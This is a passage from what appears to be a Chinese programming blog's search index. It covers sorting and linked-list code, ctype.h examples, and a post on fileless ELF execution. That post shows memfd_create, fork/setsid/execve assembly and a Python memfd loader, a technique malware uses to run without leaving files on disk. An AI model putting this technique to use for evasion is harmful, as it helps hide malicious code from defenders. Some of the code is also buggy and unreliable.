printf(&quot;ok&quot;); pthread_exit(NULL);&#125; Java","tags":["进程和线程"],"categories":["Language"]},{"title":"算法和数据结构基础篇","path":"/re4mile/2021/06/07/计算机基础/算法和数据结构/基础/pc/","content":"基础知识算法基础插入排序用一张图就可以很好的说明插入排序的一个过程 但是不同于我们平时打扑克牌插入排序 我们得从第i张牌,拿着[0,i-1]的牌和第i张牌做一个比较 而不是一个双向的比较过程 非递归 123456789101112131415161718192021222324252627282930313233343536#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define bType int#define mType unsigned charvoid Insertion_sort(mType* Arr,bType len)&#123;\tmType tmp = 0;\tint i = 0, j = 0;\tif (len &lt; 2)//没有比较的必要 return;\t// &quot;0489351762&quot;;\tfor (i = 1; i &lt; len; i++)//每次插入都可以保证前面的牌是正确的顺序\t&#123; tmp = Arr[i]; for (j = i - 1; j &gt;= 0; j--) &#123; if (Arr[j] &lt;tmp)//发现找到数据了,就不再遍历 &#123; break;//就是为了找到那个比自己小的牌,然后插在它的后面 &#125; Arr[j + 1] = Arr[j];//一直比较,数据一直后移动的过程 &#125; Arr[j + 1] = tmp;//主要是为了找到正确的位置j,然后把我们的的牌插在后面\t&#125;\treturn;&#125;int main()&#123;\tmType resmile[] = &quot;0489351762&quot;;\tInsertion_sort(resmile, strlen((char*)resmile));\treturn 0;&#125; 分治算法-归并排序分治模式在每层递归时都有三个步骤: 分解原问题为若干子问题，这些子问题是原问题的规模较小的实例。 解决这些子问题，递归地求解各子问题。然而，若子问题的规模足够小，则直接求解。 合并这些子问题的解成原问题的解。 归并排序算法完全遵循分治模式。 直观上其操作如下: 分解:分解待排序的n个元素的序列成各具n&#x2F;2个元素的两个子序列。 解决:使用归并排序递归地排序两个子序列。 合并:合并两个已排序的子序列以产生已排序的答案。 当待排序的序列长度为1时，递归“开始回升”，在这种情况下不要做任何工作，因为长度为1的每个序列都已排好序。 其实就是一个不断的1&#x2F;2的过程,然后排序 说一下这个原理 假设有2堆扑克牌,是已经排好序的 我们把2堆扑克牌最顶上2张比较,然后抽出较小的放在第三堆 然后继续比较刚才2堆,继续把较小的放在底三堆 一直比较抽出到其中一堆没有牌比较为止 下面分别用循环和递归实现,排序2个有序队列用的是相同的 void Merge(mType* nums, bType start, bType mid, bType end); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;math.h&gt;#define bType long long#define mType unsigned charvoid MergeSort_XH(mType* nums, bType length);void MergeSort_DG(mType* nums, bType start,bType End);void Merge(mType* nums, bType start, bType mid, bType end);bType main()&#123;\tint i = 0;\tint len = 0;\tmType a[] = &#123; 0,4,8,9,3,5,1,7,2,6 &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1,7,2 &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1,7, &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1 &#125;;\t//mType a[] = &#123; 4,0,1 &#125;;\t//mType a[] = &#123; 4,0&#125;;\t//mType a[] = &#123; 4&#125;;\tlen = sizeof(a) / sizeof(a[0]);\tMergeSort_DG(a, 0,len);\tfor (i = 0; i &lt; len; i++) printf(&quot;%d &quot;, a[i]);\treturn 0;&#125;//num\t-- 待排序的数组//start -- 排序的起点//end\t-- 排序的终点,void MergeSort_DG(mType* Arr, bType start, bType end) &#123;\tbType mid = 0;\t//判断起点是否小于终点\tif (end - start &lt; 2) //成员只有0,1个的时候,就不再排序\t&#123; return;\t&#125;\t//进行分割操作\tmid = (start + end) / 2;\tMergeSort_DG(Arr, start, mid);//0-4\tMergeSort_DG(Arr, mid, end);//4-7\t//归并两个子列\tMerge(Arr, start, mid, end);&#125;//Arr -- 待排序数组//len -- 数组长度void MergeSort_XH(mType* Arr, bType len)&#123;\tbType i = 0;\tbType j = 0;\tbType Length_of_Compare = 0;\tbType Begin1 = 0, Begin2 = 0, EndFlag = 0;\tfor (i = 1; i &lt; len; i = i * 2)//i的2次方,对拥有2的幂次方个数值的小组进行两两合并\t&#123; j = 0; while (j + 2 * i &lt;= len)//因为是终点,所以会&lt;=判断 &#123; j += 2 * i; Begin1 = j - 2 * i; //j+[0,i) Begin2 = j - i; //j+[i,2*i) EndFlag = j + 0; //总长度[0,2*i) Merge(Arr, Begin1, Begin2, EndFlag); &#125; //剩下1,2 if (j + i &lt; len)//如果有剩余的,看看有没有和它匹配的 &#123; Begin1 = j + 0;//起点的一半 Begin2 = j + i;//另外一半 EndFlag = len; Merge(Arr, Begin1, Begin2, EndFlag); &#125;\t&#125;&#125;void Merge(mType* Arr, bType Start1, bType Start2, bType End)&#123;\t//需要一个临时数组来存放排序好的数据\t// 对分割数列进行归并\tbType i = Start1;\tbType j = Start2;\tbType Max1 = Start2;\tbType Max2 = End;\tbType k = 0;\tbType len = 0;\tmType* ArrTmp = 0;\tlen = End - Start1;\tdo\t&#123; ArrTmp = (mType*)malloc(sizeof(mType) * len);\t&#125; while (!ArrTmp);\tmemset(ArrTmp, 0, sizeof(mType) * len);\tfor (k = 0; k &lt; len; k++)\t&#123; //从两个子序列中取出数据放入临时数组 if (i &lt; Max1 &amp;&amp; (Arr[i] &lt; Arr[j] || j == Max2)) &#123; ArrTmp[k] = Arr[i];//把小的那个拿出来 i++; &#125; else &#123; ArrTmp[k] = Arr[j]; j++; &#125;\t&#125;\t//将临时数组的值重现赋给数组\tmemcpy((char*)Arr + Start1, ArrTmp, len * sizeof(mType));\t//释放临时数组\tfree(ArrTmp);\treturn;&#125; 冒泡排序书上说他是一个比较流行但是垃圾的算法,原理是反复交换相邻的未按给定次序排列的元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;stdio.h&gt;#define bType long long#define mType unsigned char void Bubble_Sort(mType* dw_Arr, bType len);bType main()&#123;\tint i = 0;\tint len = 0;\tmType a[] = &#123; 0,4,8,9,3,5,1,7,2,6 &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1,7,2 &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1,7, &#125;;\t//mType a[] = &#123; 0,4,8,9,3,5,1 &#125;;\t//mType a[] = &#123; 4,0,1 &#125;;\t//mType a[] = &#123; 4,0&#125;;\t//mType a[] = &#123; 4&#125;;\tlen = sizeof(a) / sizeof(a[0]); Bubble_Sort(a,len);\tfor (i = 0; i &lt; len; i++) printf(&quot;%d &quot;, a[i]);\treturn 0;&#125; void Bubble_Sort(mType* dw_Arr,bType len)&#123; bType i = 0; bType j = 0; mType dw_tmp = 0; for (i = 0; i &lt; len - 1; i++) &#123; for (j = 0; j &lt; len - 1 - i; j++) &#123; if (dw_Arr[j] &gt; dw_Arr[j + 1]) &#123; dw_tmp = dw_Arr[j]; dw_Arr[j] = dw_Arr[j + 1]; dw_Arr[j + 1] = dw_tmp; &#125; &#125; &#125;&#125; 数组稀疏矩阵 比如地图如图所示,其中有很多的0,我们不记录,只记录关键的数据 然后我们可以类似的做出下面的结构体 12345678910111213141516171819struct Valid_Values&#123; bType x;//记录有效数据的x坐标 bType y;//记录有效数据的y坐标 bType data;//记录有效数据的值 &#125;;struct head_info&#123; bType cnt_row;//记录有几行 bType cnt_col;//记录有几列 bType cnt_Values;//记录有几个有效数据&#125;;struct SparseArray&#123; struct head_info headinfo_;//描述了稀疏矩阵的属性 struct Valid_Values* lp_data;//指向有效数据&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define bType long long#define mType charclass SparseMap&#123;private:\tbType\trow;//行\tbType\tcol;//列\tbType\tcnt;//多少个数据\tbType* Data;//具体数据(x,y)public:\tSparseMap()\t&#123; row = 0; col = 0; Data = 0; cnt = 0;\t&#125;\tSparseMap(bType In_Row, bType In_Col)\t&#123; row = In_Row; col = In_Col; Data = 0; cnt = 0;\t&#125;\t~SparseMap()\t&#123; if (Data) free(Data);\t&#125;\tvoid InitMap(bType* In_Arr, bType In_len);//当作一个二维数组来算\tvoid ShowMap();//输出稀疏矩阵&#125;;void SparseMap::InitMap(bType* In_Arr, bType In_len)//当作一个二维数组来算&#123;\tbType i = 0, local_row = 0, local_col = 0;\tData = 0;\tcnt = In_len;\tdo\t&#123; Data = (bType*)malloc(In_len * 3 * sizeof(bType));\t&#125; while (!Data);\tmemset(Data, 0, In_len * 3 * sizeof(bType));\tfor (i = 0; i &lt; In_len; i++)\t&#123; local_row = *(In_Arr + 2 * i + 0); local_col = *(In_Arr + 2 * i + 1); *(Data + 3 * i + 0) = local_row; *(Data + 3 * i + 1) = local_col; *(Data + 3 * i + 2) = 1;\t&#125;&#125;void SparseMap::ShowMap()&#123;\tbType i = 0, j = 0, local_cnt = 0;\tfor (i = 0; i &lt; row; i++)\t&#123; for (j = 0; j &lt; col; j++) &#123; if (local_cnt &lt; cnt &amp;&amp; (i == *(Data + 3 * local_cnt + 0)) &amp;&amp; (j == *(Data + 3 * local_cnt + 1))) &#123; printf(&quot;%lld &quot;, *(Data + 3 * local_cnt + 2)); local_cnt++; &#125; else &#123; printf(&quot;0 &quot;); &#125; &#125; printf(&quot; &quot;);\t&#125;&#125;int main()&#123;\tclass SparseMap local_SparseMap(10, 10);\tbType Data[] = &#123; 0,0,1,1,2,2,3,3,4,4, &#125;;\tlocal_SparseMap.InitMap(Data, 5);\tlocal_SparseMap.ShowMap();\treturn 0;&#125; 置于地图如何转化为稀疏矩阵,我就不再多写 循环队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define bType long long#define mType charclass ArrQueue&#123;private:\tbType First;\tbType Last;\tbType Max;\tbType cnt = 0;\tbType *Data;//0不用于存放,用于计数public:\tArrQueue()\t&#123; First\t= 0;//指向当前那个 Last\t= 0;//指向当前那个 Data\t= 0; Max = 0;\t&#125;\tArrQueue(bType In_Length)\t&#123; First\t= 0; Last\t= 0; Data = 0; Max = In_Length; do &#123; Data = (bType*)malloc(sizeof(mType) * In_Length); &#125; while (!Data); memset(Data, 0, sizeof(mType) * In_Length);\t&#125;\t~ArrQueue()\t&#123; if (Data) &#123; free(Data); &#125;\t&#125;\tmType in(mType qValue);\tmType out();\tvoid show();&#125;;mType ArrQueue::in( mType In_Value)&#123;\tif (cnt != Max)\t&#123; *((mType*)Data + Last) = In_Value; cnt++; Last = (Last + 1) % Max; return In_Value;\t&#125;\telse\t&#123; return -1;\t&#125;&#125;mType ArrQueue::out()&#123; mType local_Ret = 0;\tif (cnt)\t&#123; local_Ret = *((mType*)Data + First); *((mType*)Data + First) = 0; cnt--; First = (First + 1) % Max; return local_Ret;\t&#125;\telse\t&#123; return -1;\t&#125;&#125;void ArrQueue::show()&#123;\tbType i= 0;\tprintf(&quot; -------- &quot;);\tfor (i = 0; i &lt; cnt; i++)\t&#123; printf(&quot;%c\\t&quot;, *((mType*)Data + i));\t&#125;\tprintf(&quot; -------- &quot;);\treturn;&#125;int main()&#123;\tclass ArrQueue local_ArrQueue(5);\tlocal_ArrQueue.in(&#x27;A&#x27;);\tlocal_ArrQueue.in(&#x27;B&#x27;);\tlocal_ArrQueue.in(&#x27;C&#x27;);\tlocal_ArrQueue.out();\tlocal_ArrQueue.in(&#x27;D&#x27;);\tlocal_ArrQueue.out();\tlocal_ArrQueue.in(&#x27;D&#x27;);\tlocal_ArrQueue.in(&#x27;E&#x27;);\tlocal_ArrQueue.in(&#x27;F&#x27;);\tlocal_ArrQueue.show();\treturn 0;&#125; 链表单链表代码报告: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define bType long long#define mType char//不需要你去delete,它自己会有比较好的内存灰色机制struct LinkNode&#123;\tmType Data;\tstruct LinkNode* next;\tLinkNode()\t&#123; next = 0; Data = 0;\t&#125;\tLinkNode(mType In_Data)\t&#123; next = 0; Data = In_Data;\t&#125;\t~LinkNode()\t&#123; //printf(&quot;Die &quot;);\t&#125;&#125;;class LinkNodeAdmin&#123;private:\tbType cnt;\tstruct LinkNode Head;public:\tLinkNodeAdmin()\t&#123; cnt = 0; Head.Data = 0; Head.next = 0;\t&#125;\t~LinkNodeAdmin()\t&#123; struct LinkNode* tmp1 = 0; struct LinkNode* tmp2 = 0; tmp1 = Head.next; while (tmp1) &#123; tmp2 = tmp1-&gt;next; delete tmp1; tmp1 = tmp2; &#125;\t&#125;\tbType Add(struct LinkNode*);\tbType AddByOrder(struct LinkNode*);\tvoid Show();\tvoid Display_in_reverse_order();\tstruct LinkNode*\tFind(struct LinkNode*);\tbType Update(struct LinkNode*, struct LinkNode*);\tbType De1ete(struct LinkNode*);\tstruct\tLinkNode*\tGetIndex(bType);\tvoid ReverseLintList();&#125;;bType LinkNodeAdmin::Add(struct LinkNode* In_LinkNode)//不会有检测相同元素的功能&#123;\tstruct LinkNode* tmp = 0;\ttmp = &amp;Head;\twhile (tmp-&gt;next)\t&#123; tmp = tmp-&gt;next;\t&#125;\ttmp-&gt;next = In_LinkNode;\tcnt++;\treturn 1;&#125;bType LinkNodeAdmin::AddByOrder(struct LinkNode* In_LinkNode)//不会有检测相同元素的功能&#123;\tstruct\tLinkNode* tmp = 0;\ttmp = &amp;Head;\twhile (1)//我的终止 1.遍历到最后,导致如果我么有\t&#123; if (!(tmp-&gt;next))//说明temp已经在链表的最后 &#123; break; &#125; if (In_LinkNode-&gt;Data &lt; tmp-&gt;next-&gt;Data)//找到下一个比我大的 &#123; break; &#125; tmp = tmp-&gt;next;\t&#125;\tIn_LinkNode-&gt;next = tmp-&gt;next;\ttmp-&gt;next = In_LinkNode;\tcnt++;\treturn 1;&#125;struct\tLinkNode* LinkNodeAdmin::Find(struct LinkNode* In_LinkNode)//直接对已有的数据修改,而不是查找编号什么的&#123;\tbType flag = 0;\tstruct LinkNode* tmp = &amp;Head;\twhile (cnt)//链表是否为空\t&#123; if (!(tmp-&gt;next)) &#123; break; //已经遍历完链表 &#125; if (tmp-&gt;next-&gt;Data == In_LinkNode-&gt;Data) &#123; //找到 delete In_LinkNode; flag = 1; break; &#125; tmp = tmp-&gt;next;\t&#125;\t//根据flag 判断是否找到要修改的节点\tif (flag)\t&#123; //tmp-&gt;Data = In_LinkNode-&gt;Data; //返回上一个节点,更加利于后续操作 return tmp;\t&#125;\telse\t&#123; //没有找到 printf(&quot;没有找到 %c 数据 &quot;, In_LinkNode-&gt;Data); return 0;\t&#125;&#125;bType LinkNodeAdmin::De1ete(struct LinkNode* In_Target_LinkNode)//我需要找到它的前驱&#123;\tstruct LinkNode* tmp1 = 0;\tstruct LinkNode* tmp2 = 0;\ttmp1 = Find(In_Target_LinkNode);//返回的是目标的上一个结点\tif (tmp1)\t&#123; tmp2 = tmp1-&gt;next; if (tmp2) &#123; tmp2 = tmp2-&gt;next;//防止只有2个节点 &#125; delete(tmp1-&gt;next); tmp1-&gt;next = tmp2; cnt--; return 1;\t&#125;\telse\t&#123; printf(&quot;没有找到数据 &quot;); return 0;\t&#125;&#125;bType LinkNodeAdmin::Update(struct LinkNode* In_Target_LinkNode, struct LinkNode* In_LinkNode_src)&#123;\tif (De1ete(In_Target_LinkNode))//可能会delete失败,因为自带find\t&#123; AddByOrder(In_LinkNode_src); return 1;\t&#125;\telse\t&#123; printf(&quot;没有找到数据 &quot;); return 0;\t&#125;&#125;struct LinkNode* LinkNodeAdmin::GetIndex(bType In_Index)//输入负数就是倒数第几个&#123;\tstruct LinkNode* tmp = &amp;Head;\tbType i = 0;\tbType flag = 0;\tbType max = 0;\tif (In_Index &lt; 0)\t&#123; In_Index++; flag = 1; In_Index = 0 - In_Index; max = cnt - In_Index;\t&#125;\telse\t&#123; In_Index--; max = In_Index + 1;\t&#125;\tif (In_Index &gt;= 0 &amp;&amp; In_Index &lt; cnt)\t&#123; for (i = 0; i &lt; max; i++) &#123; tmp = tmp-&gt;next; &#125; return tmp;\t&#125;\treturn 0;&#125;void LinkNodeAdmin::Show()&#123;\tbType i = 0;\tstruct\tLinkNode* tmp = &amp;Head;\tfor (i = 0; i &lt; cnt; i++)\t&#123; tmp = tmp-&gt;next; printf(&quot;%c\\t&quot;, tmp-&gt;Data);\t&#125;\tputs(&quot; &quot;);\treturn;&#125;void LinkNodeAdmin::ReverseLintList()//必须要自己画图去过一遍&#123;\tstruct\tLinkNode*\tMyHeadA = 0;\tstruct\tLinkNode\tMyHeadB;\tstruct\tLinkNode*\tnext = 0; MyHeadA = Head.next;\tif (Head.next == 0 || Head.next-&gt;next==0)//如果前面一个成立，后面就不需要判断了,也就不会出现那种什么0-&gt;next了\t&#123; return;\t&#125;\twhile (MyHeadA) &#123; next = MyHeadA-&gt;next;\t//为什么会有next=xx，因为下面会修改 cur-&gt;next，作用主要是备份数据 MyHeadA-&gt;next\t= MyHeadB.next; // MyHeadB.next\t= MyHeadA; MyHeadA = next; &#125;\tHead.next = MyHeadB.next;\treturn;&#125;void LinkNodeAdmin::Display_in_reverse_order()&#123;\t//可以用栈的思想,但是用栈的话,开销也不小,所以我自己就new了一个数组,然后用数组去逆序的打印呗\t//他的cnt告诉了我要new多少个\tstruct\tLinkNode** Arr = new struct\tLinkNode* [cnt];//这个是数组装的是指针,装的是*,所以自己是**\tbType i = 0;\tstruct\tLinkNode* tmp = Head.next;\tfor (i = 0; i &lt; cnt; i++)\t&#123; Arr[i] = tmp; tmp = tmp-&gt;next;\t&#125;\tfor (i = cnt-1; i&gt;=0; i--)\t&#123; printf(&quot;%c\\t&quot;, Arr[i]-&gt;Data);\t&#125;\tdelete[] Arr;\treturn;&#125;int main()&#123;\tclass LinkNodeAdmin local_LinkTable;\t//add之类的,new后会继续使用\t//find的,\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;E&#x27;));\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;D&#x27;));\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;C&#x27;));\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;B&#x27;));\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;A&#x27;));\tlocal_LinkTable.AddByOrder(new LinkNode(&#x27;F&#x27;));\t//local_LinkTable.GetIndex(0);\t//local_LinkTable.Show();\t//local_LinkTable.ReverseLintList();\t//local_LinkTable.Show();\tlocal_LinkTable.Display_in_reverse_order();\treturn 0;&#125; 双向链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define bType long long#define mType char//不需要你去delete,它自己会有比较好的内存灰色机制struct LinkNode&#123; struct LinkNode*\tPrevious;\tmType Data;\tstruct LinkNode*\tNext;\tLinkNode()\t&#123; Previous = 0; Data = 0; Next = 0; &#125;\tLinkNode(mType In_Data)\t&#123; Previous = 0; Data = In_Data; Next = 0; &#125;\t~LinkNode()\t&#123; //printf(&quot;Die &quot;);\t&#125;&#125;;class LinkNodeAdmin&#123; //增加删除修改查找private:\tstruct LinkNode Head; //因为是一个环形的,所以从具体的意义上来说是分不清谁是头谁是尾,但是我们必须设置一个头尾\tbType cnt; //为了方便,我们仍然会去计数一下public :\tLinkNodeAdmin()\t&#123; cnt = 0; Head.Data = 0; Head.Previous\t= &amp;Head; Head.Next = &amp;Head;\t&#125;\t~LinkNodeAdmin()\t&#123; bType i = 0; struct LinkNode* tmp1 = Head.Next; struct LinkNode* tmp2 = 0; for (i = 0; i &lt; cnt; i++) &#123; tmp2 = tmp1-&gt;Next; delete tmp1; tmp1 = tmp2; &#125;\t&#125;\tvoid Show();\tvoid Add(struct LinkNode*);\tvoid AddByOrder(struct LinkNode*);\tstruct LinkNode*\tFind(struct LinkNode*);\tbType De1ete(struct LinkNode*);\tbType Update(struct LinkNode*, struct LinkNode* );\t&#125;;void LinkNodeAdmin::Add(struct LinkNode* In_Node)//插在哪里?我们是不需要遍历的,因为我们可以通过头结点知道最后一个节点&#123;\t//直接插,插的话,不需要知道还有几个\tstruct LinkNode* Tail = Head.Previous;\tHead.Previous = In_Node;\tTail-&gt;Next = In_Node;\tIn_Node-&gt;Previous = Tail;\tIn_Node-&gt;Next = &amp;Head;\tcnt++;\treturn;&#125;void LinkNodeAdmin::AddByOrder(struct LinkNode* In_Node)&#123;\tstruct LinkNode* tmp = Head.Next;//\t//涉及一个比较的过程\tstruct LinkNode* local_pre =0 ;//\tbType i = 0;\tfor (i = 0; i &lt; cnt; i++)\t&#123; if (tmp-&gt;Data &gt; In_Node-&gt;Data) &#123; break;//我们要找的就是这个比自己大的,我们要插在他前面 &#125; tmp = tmp-&gt;Next;\t&#125;\t//有一种情况,我要插在Head的后面\tlocal_pre = tmp-&gt;Previous;\tlocal_pre-&gt;Next = In_Node;\ttmp-&gt;Previous\t= In_Node;\tIn_Node-&gt;Previous = local_pre;\tIn_Node-&gt;Next = tmp;\tcnt++;\treturn;&#125;void LinkNodeAdmin::Show()&#123;\tstruct LinkNode* tmp = Head.Next;//\tbType i = 0;\tfor (i = 0; i &lt; cnt; i++)\t&#123; printf(&quot;%c\\t&quot;, tmp-&gt;Data); tmp = tmp-&gt;Next;\t&#125;&#125;struct LinkNode* LinkNodeAdmin::Find(struct LinkNode* In_Node)&#123;\tbType i = 0;\tstruct LinkNode* tmp = Head.Next;\tif (In_Node)\t&#123; for (i = 0; i &lt; cnt; i++) &#123; if (tmp-&gt;Data == In_Node-&gt;Data) &#123; delete In_Node; return tmp; &#125; tmp = tmp-&gt;Next; &#125;\t&#125;\tdelete In_Node;\treturn 0;&#125;bType LinkNodeAdmin::De1ete(struct LinkNode* In_Node)&#123;\tstruct LinkNode* tmp = 0;\tstruct LinkNode* local_pre = 0;\tstruct LinkNode* local_next = 0;\ttmp = Find(In_Node);\tif (tmp)\t&#123; local_pre = tmp-&gt;Previous; local_next = tmp-&gt;Next; delete tmp; local_pre-&gt;Next = local_next; return 1; //然后删除\t&#125;\treturn 0;&#125;bType LinkNodeAdmin::Update(struct LinkNode* Target, struct LinkNode* rep)&#123;\tif (De1ete(Target))//自带find,所以一避免多次delete\t&#123; AddByOrder(rep); return 1;\t&#125;\treturn 0;&#125;int main()&#123;\tclass LinkNodeAdmin local_LinkNodeAdmin;\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;B&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;C&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;E&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;F&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;G&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;D&#x27;));\tlocal_LinkNodeAdmin.AddByOrder(new LinkNode(&#x27;A&#x27;));\t//local_LinkNodeAdmin.De1ete(new LinkNode(&#x27;B&#x27;));\t//local_LinkNodeAdmin.Show();\tlocal_LinkNodeAdmin.Update(new LinkNode(&#x27;E&#x27;), new LinkNode(&#x27;X&#x27;));\treturn 0; &#125;","tags":["C","算法和数据结构"],"categories":["计算机基础"]},{"title":"ELF无文件运行初级篇","path":"/re4mile/2021/06/07/linux/小专题/无文件运行/基础篇/linux/","content":"参考链接https://www.anquanke.com/post/id/168791 https://blog.csdn.net/Rong_Toa/article/details/109845832 其实这个参考链接讲的更多的是用8种语言的应用无文件执行elf C1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;int main()&#123; int fd; pid_t child; char buf[BUFSIZ] = &quot;&quot;; ssize_t br; fd = syscall(SYS_memfd_create, &quot;foofile&quot;, 0); if (fd == -1) &#123; perror(&quot;memfd_create&quot;); exit(EXIT_FAILURE); &#125; child = fork(); if (child == 0)//子进程 &#123; dup2(fd, 1);//关闭1,复制一份fd给1,于是fd和1指向了相同的共享内存 close(fd);//减少一次引用 execlp(&quot;/bin/date&quot;, &quot;/bin/date&quot;, NULL);//执行这句话 perror(&quot;execlp date&quot;); exit(EXIT_FAILURE); &#125; else if (child == -1) &#123; perror(&quot;fork&quot;); exit(EXIT_FAILURE); &#125; //父进程 waitpid(child, NULL, 0);//等待子进程结束 lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) &#123; perror(&quot;read&quot;); exit(EXIT_FAILURE); &#125; buf[br] = 0; printf(&quot;child said: &#x27;%s&#x27;n&quot;, buf); exit(EXIT_SUCCESS); return 0;&#125; 汇编我们先来试着理解隐藏在字节数组背后的内容。 12345push 57pop raxsyscalltest eax, eaxjnz quit 首先我们需要运行fork，64位系统上对应的调用号为57，具体调用表可参考此处链接。 然后我们需要调用setsid（调用号为112）将子进程转换成父进程。 123push 112pop raxsyscall 然后再次调用fork： 12345push 57pop raxsyscalltest eax, eaxjnz quit 然后再轻车熟路调用execve()： 12345678910; execvemov rdi, 0xcafebabecafebabe ; filenamemov rsi, 0xdeadbeefdeadbeef ; argvxor rdx, rdx ; envppush 0x3bpop raxsyscallpush -1pop raxret 最后调用exit()（调用号为60）结束进程。 1234567; exitquit:push 0pop rdipush 60pop raxsyscall Python12345678910import ctypesimport oself_binary = open(&#x27;./w&#x27;,&#x27;rb&#x27;).read() # 我们要执行的文件fd = ctypes.CDLL(None).syscall(319,&quot;&quot;,1) # 创建共享内存final_fd = open(&#x27;/proc/self/fd/&#x27;+str(fd),&#x27;wb&#x27;) # 往内存里面写入文件final_fd.write(elf_binary)final_fd.close()os.execl(&#x27;/proc/self/fd/&#x27;+str(fd),&#x27;argv0&#x27;,&#x27;argv1&#x27;) # 这里是直接执行文件描述符,而不是直接调用那个syscallprint(&#x27;father exit &#x27;) 其中w,是我们当前文件要执行的内容 我感到疑惑的地方就是,父进程怎么返回","tags":["ELF","Linux"],"categories":["Reverse"]},{"title":"ctype.h","path":"/re4mile/2021/06/07/language/C/库函数/ctype/language/","content":"isprint 检测是否可打印空格也可以打印 int isprint(int ASCII) 可打印返回非零 否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if (isprint(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 1! &quot; # $ % &amp; &#x27; ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; &lt; = &gt; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z &#123; | &#125; ~ isgraph 检测是否有图形表示(空格除外) int isgraph(int ASCII) 可打印返回非零(空格除外) 否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if (isgraph(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 1! &quot; # $ % &amp; &#x27; ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; &lt; = &gt; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z &#123; | &#125; ~ isalnum 检测是否是数字或者字母 int isalnum(int ASCII) 检测你的ASCII是不是数字或者字母 1不是ASCII的1 ‘1’才是ASCII的‘1’ 函数 返回非零状态,表示字母数字 返回零,不是字母数字 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if (isalnum(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 10 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z isalpha 检测是不是字母 int isalpha(int ASCII) 是字母返回非零 否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if (isalpha(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 1A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z islower 检测是小写字母 int islower(int ASCII) 是小写字母返回非零 否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if ( islower(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 1a b c d e f g h i j k l m n o p q r s t u v w x y z isupper 检测是大写字母 int isupper(int c) 是大写字母返回非零 